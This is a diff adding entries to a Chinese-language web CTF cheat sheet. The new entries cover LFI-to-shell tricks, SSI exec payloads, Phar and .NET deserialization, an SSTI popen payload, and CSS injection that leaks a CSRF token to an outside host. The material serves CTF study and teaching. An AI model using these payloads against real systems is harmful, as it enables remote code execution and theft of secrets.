@@ -571,6 +571,9 @@ Request: `http://kaibro.tw/test.php?url=%67%67`
     - 不直接吃換行字元和\t字元
     - 但可以吃'\n'和'\t'
         - 會轉成換行字元和Tab
+    - 也吃`\uxxxx`形式
+        - `json_decode('{"a":"\u0041"}')`
+
 
 - === bug
     - `var_dump([0 => 0] === [0x100000000 => 0])`
@@ -1365,7 +1368,9 @@ HQL injection example (pwn2win 2017)
 
 - 對server以form-data上傳文件，會產生tmp檔
 - 利用phpinfo得到tmp檔路徑和名稱
-- Get shell
+- LFI Get shell
+- 限制
+    - Ubuntu 17後，預設開啟`PrivateTmp`，無法利用
 
 ## php session
 
@@ -1376,6 +1381,14 @@ HQL injection example (pwn2win 2017)
     - /tmp/
     - /var/lib/php5/
     - /var/lib/php/
+- `session.upload_progress`
+    - PHP預設開啟
+    - 用來監控上傳檔案進度
+    - 當`session.upload_progress.enabled`開啟，可以POST在`$_SESSION`中添加資料 (`sess_{PHPSESSID}`)
+    - 配合LFI可以getshell
+    - `session.upload_progress.cleanup=on`時，可以透過Race condition
+    - Example
+        - HITCON CTF 2018 - One Line PHP Challenge
 
 ## data://
 
@@ -1401,6 +1414,16 @@ HQL injection example (pwn2win 2017)
             $p->addFromString('b.jpg', $x);
         ?>
     - 構造 `?file=phar://phartest.zip/b.jpg`
+
+## SSI (Server Side Includes)
+
+- 通常放在`.shtml`, `.shtm`
+- Execute Command
+    - `<!--#exec cmd="command"-->`
+- File Include
+    - `<!--#include file="../../web.config"-->`
+- Example
+    - HITCON CTF 2018 - Why so Serials?
 
 # 上傳漏洞
 
@@ -1557,6 +1580,17 @@ HQL injection example (pwn2win 2017)
     - `O:4:"test":1:{s:1:"a";s:3:"aaa";}`
     - 兩者結果相同
 
+- Phar:// 反序列化
+    - phar文件會將使用者自定義的metadata以序列化形式保存
+    - 透過`phar://`偽協議可以達到反序列化的效果
+    - 常見影響函數: `file_get_contents()`, `file_exists()`, `is_dir()`, ...
+    - Generic Gadget Chains
+        - [phpggc](https://github.com/ambionics/phpggc)
+    - Example
+        - HITCON CTF 2017 - Baby^H Master PHP 2017
+        - HITCON CTF 2018 - Baby Cake
+        - DCTF 2018 - Vulture
+
 ## Python Pickle
 
 - `dumps()` 將物件序列化成字串
@@ -1659,6 +1693,13 @@ print marshalled
 
 - https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet
 
+## .NET Derserialization
+
+- [ysoserial.net](https://github.com/pwntester/ysoserial.net)
+- asp.net中ViewState以序列化形式保存資料
+    - 有machinekey或viewstate未加密/驗證時，可以RCE
+- Example
+    - HITCON CTF 2018 - Why so Serials?
 
 # SSTI 
 
@@ -1689,7 +1730,7 @@ Server-Side Template Injection
     - `{{ config['RUNCMD']('cat flag',shell=True) }}`
 
 - RCE (another way)
-        - `{{''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('ls').read()}}`
+    - `{{''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('ls').read()}}`
 - 過濾中括號
     - `__getitem__`
     - `{{''.__class__.__mro__.__getitem__(2)}}`
@@ -2210,6 +2251,17 @@ https://csp-evaluator.withgoogle.com/
             - Browser: `/1%2f%3Fquery={}*{background-color%3Ared}%2f..%2f../test.php`
                 - CSS會載入`/1/?query={}*{background-color:red}/../../1/`
             - CSS語法容錯率很高
+
+## CSS Injection
+
+- CSS可控時，可以Leak Information
+- Example:
+    - leak `<input type='hidden' name='csrf' value='2e3d04bf...'>`
+    - `input[name=csrf][value^="2"]{background: url(http://kaibro.tw/2)}`
+    - `input[name=csrf][value^="2e"]{background: url(http://kaibro.tw/2e)}`
+    - ...
+    - SECCON CTF 2018 - GhostKingdom
+
 # 密碼學
 
 ## PRNG
